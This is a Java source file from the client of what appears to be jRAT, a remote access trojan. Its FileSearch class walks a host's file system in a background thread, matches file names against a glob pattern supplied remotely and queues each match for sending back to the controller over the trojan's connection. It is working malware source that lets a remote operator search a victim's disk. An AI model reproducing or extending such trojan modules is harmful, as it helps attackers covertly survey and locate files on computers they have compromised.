package jrat.module.fs;

import jrat.client.Connection;
import jrat.module.fs.packets.Packet37SearchResult;

import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;

public class FileSearch extends Thread implements FileVisitor<Path> {

	private static boolean running;

	private Connection con;
	private String searchRoot;
	private String name;
	private boolean dir;
	private PathMatcher matcher;

	public FileSearch(Connection con, String searchRoot, String pattern, boolean dir) {
		this.con = con;
		this.searchRoot = searchRoot;
		this.name = pattern;
		this.dir = dir;

		matcher = FileSystems.getDefault().getPathMatcher("glob:" + pattern);
	}

	public void run() {
		running = true;
		try {
			search(name);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void search(String dir) throws Exception {
		Path path = FileSystems.getDefault().getPath(searchRoot);

		Files.walkFileTree(path, this);
	}
	
	public static boolean isRunning() {
		return running;
	}
	
	/**
	 * Will quickly halt searching in case of interrupted connection etc
	 */
	public static void stopSearch() {
		running = false;
	}

	public FileVisitResult visitFile(Path path, BasicFileAttributes attributes) {
		String parent = path.toFile().getParent();
		String name = path.toFile().getName();
		boolean dir = path.toFile().isDirectory();

		if (matcher.matches(path.getFileName())) {
			con.addToSendQueue(new Packet37SearchResult(parent, name, dir));
		}

		return FileVisitResult.CONTINUE;
	}

	public FileVisitResult preVisitDirectory(Path path, BasicFileAttributes attributes) {
		return FileVisitResult.CONTINUE;
	}

	public FileVisitResult visitFileFailed(Path path, IOException ex) {
		return FileVisitResult.CONTINUE;
	}

	public FileVisitResult postVisitDirectory(Path path, IOException ex) {
		return FileVisitResult.CONTINUE;
	}
}
